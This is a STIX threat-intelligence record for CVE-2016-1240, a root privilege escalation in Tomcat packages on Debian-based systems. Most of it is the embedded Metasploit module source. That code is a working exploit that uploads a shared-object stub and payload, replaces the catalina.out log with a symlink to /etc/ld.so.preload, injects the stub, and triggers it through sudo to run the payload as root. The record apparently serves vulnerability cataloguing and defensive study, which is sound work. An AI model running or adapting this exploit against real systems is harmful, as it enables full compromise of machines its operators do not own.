{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f4781d38-153a-427d-b6d7-ce0779b4aeee",
    "created": "2024-08-14T16:59:32.399589Z",
    "modified": "2024-08-14T16:59:32.399593Z",
    "name": "Apache Tomcat on Ubuntu Log Init Privilege Escalation",
    "description": " Tomcat (6, 7, 8) packages provided by default repositories on Debian-based distributions (including Debian, Ubuntu etc.) provide a vulnerable tomcat init script that allows local attackers who have already gained access to the tomcat account (for example, by exploiting an RCE vulnerability in a java web application hosted on Tomcat, uploading a webshell etc.) to escalate their privileges from tomcat user to root and fully compromise the target system.  Tested against Tomcat 8.0.32-1ubuntu1.1 on Ubuntu 16.04  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/tomcat_ubuntu_log_init_priv_esc.rb",
            "external_id": "tomcat_ubuntu_log_init_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://ubuntu.com/security/notices/USN-3081-1"
        },
        {
            "source_name": "reference",
            "url": "http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-1240"
        }
    ],
    "x_code_snippet": "###\n#\n# This exploit sample shows how an exploit module could be written to exploit\n# a bug in a command on a linux computer for priv esc.\n#\n###\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ManualRanking\n\n  include Msf::Exploit::Retry\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::Linux::Compile\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Tomcat on Ubuntu Log Init Privilege Escalation',\n        'Description' => %q{\n          Tomcat (6, 7, 8) packages provided by default repositories on Debian-based\n          distributions (including Debian, Ubuntu etc.) provide a vulnerable\n          tomcat init script that allows local attackers who have already gained access\n          to the tomcat account (for example, by exploiting an RCE vulnerability\n          in a java web application hosted on Tomcat, uploading a webshell etc.) to\n          escalate their privileges from tomcat user to root and fully compromise the\n          target system.\n\n          Tested against Tomcat 8.0.32-1ubuntu1.1 on Ubuntu 16.04\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Dawid Golunski <dawid@legalhackers.com>' # original PoC, analysis, discovery\n        ],\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_PYTHON ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'DefaultOptions' => {\n          'PrependFork' => true,\n          'WfsDelay' => 1800 # 30min\n        },\n        'References' => [\n          [ 'EDB', '40450' ],\n          [ 'URL', 'https://ubuntu.com/security/notices/USN-3081-1'],\n          [ 'URL', 'http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html'],\n          [ 'CVE', '2016-1240']\n        ],\n        'DisclosureDate' => '2016-09-30',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES, IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options [\n      OptString.new('CATALINA', [ true, 'Location of catalina.out file', '/var/log/tomcat8/catalina.out' ])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def preload\n    '/etc/ld.so.preload'\n  end\n\n  def catalina\n    datastore['CATALINA']\n  end\n\n  def check\n    package = cmd_exec('dpkg -l tomcat[6-8] | grep \\'^i\\'')\n    if package.nil? || package.empty?\n      return CheckCode::Safe('Unable to execute command to determine installed pacakges')\n    end\n\n    package = package.gsub('\\s+', ' ') # replace whitespace with space so we can split easy\n    package = package.split(' ')\n    # 0 is ii for installed\n    # 1 is tomcat# for package name\n    # 2 is version number\n    package = Rex::Version.new(package[2])\n\n    if (package.to_s.start_with?('8') && package < Rex::Version.new('8.0.32-1ubuntu1.2')) ||\n       (package.to_s.start_with?('7') && package < Rex::Version.new('7.0.52-1ubuntu0.7')) ||\n       (package.to_s.start_with?('6') && package < Rex::Version.new('6.0.35-1ubuntu3.8'))\n      return CheckCode::Appears(\"Vulnerable app version detected: #{package}\")\n    end\n\n    CheckCode::Safe(\"Unexploitable tomcat packages found: #{package}\")\n  end\n\n  def exploit\n    # Check if we're already root\n    if is_root? && !datastore['ForceExploit']\n      fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    unless file? catalina\n      fail_with Failure::BadConfig, \"#{catalina} not found or still symlinked\"\n    end\n\n    if file? preload\n      fail_with Failure::BadConfig, \"#{preload} found, check file as it needs to be removed for exploitation\"\n    end\n\n    vprint_status(\"Creating backup of #{catalina}\")\n    @catalina_content = read_file(catalina)\n    path = store_loot(\n      catalina,\n      'text/plain',\n      rhost,\n      @catalina_content,\n      'catalina.out'\n    )\n    print_good(\"Original #{catalina} backed up to #{path}\")\n\n    if live_compile?\n      # upload our privesc stub\n      so_stub = \".#{rand_text_alphanumeric(5..10)}.so\"\n      so_stub_path = \"#{base_dir}/#{so_stub}\"\n      payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n\n      # Upload exploit stub\n      vprint_status \"Compiling exploit stub: #{so_stub_path}\"\n      upload_and_compile so_stub_path, strip_comments(exploit_data('CVE-2016-1240', 'privesc_preload.c').gsub('$BACKDOORPATH', payload_path)), '-Wall -fPIC -shared -ldl'\n    else\n      payload_path = '/tmp/.jMeY5vToQl'\n      so_stub = '.ny9NyKEPJ.so'\n      so_stub_path = \"/tmp/#{so_stub}\"\n\n      write_file(so_stub_path, exploit_data('CVE-2016-1240', 'stub.so'))\n    end\n    register_file_for_cleanup(so_stub_path)\n\n    # Upload payload executable\n    vprint_status(\"Uploading Payload to #{payload_path}\")\n    upload_and_chmodx payload_path, generate_payload_exe\n    register_file_for_cleanup(payload_path)\n\n    # delete the log and symlink ld.so.preload\n    vprint_status(\"Deleting #{catalina}\")\n    rm_f(catalina)\n    vprint_status(\"Creating symlink from #{preload} to #{catalina}\")\n    cmd_exec(\"ln -s #{preload} #{catalina}\")\n    register_file_for_cleanup(catalina)\n\n    # we now need tomcat to restart\n    print_good(\"Waiting #{datastore['WfsDelay']} seconds on tomcat to re-open the logs aka a Tomcat service restart\")\n    succeeded = retry_until_truthy(timeout: datastore['WfsDelay']) do\n      file? preload\n    end\n\n    unless succeeded\n      print_error(\"#{preload} not found, exploit aborted\")\n      return\n    end\n    register_file_for_cleanup(preload)\n\n    # now that we can write to ld.so.preload, use a SUID binary to execute our stub\n    print_status(\"injecting #{so_stub_path} into #{preload}\")\n    cmd_exec \"echo #{so_stub_path} > #{preload}\"\n    print_status('Escalating payload privileges via SUID binary (sudo)')\n    cmd_exec 'sudo --help 2>/dev/null >/dev/null'\n    print_status('Executing payload')\n    cmd_exec payload_path\n  end\n\n  def cleanup\n    if @catalina_content.nil?\n      cmd_exec(\"touch #{catalina}\")\n    else\n      write_file(catalina, @catalina_content)\n    end\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-09-30",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}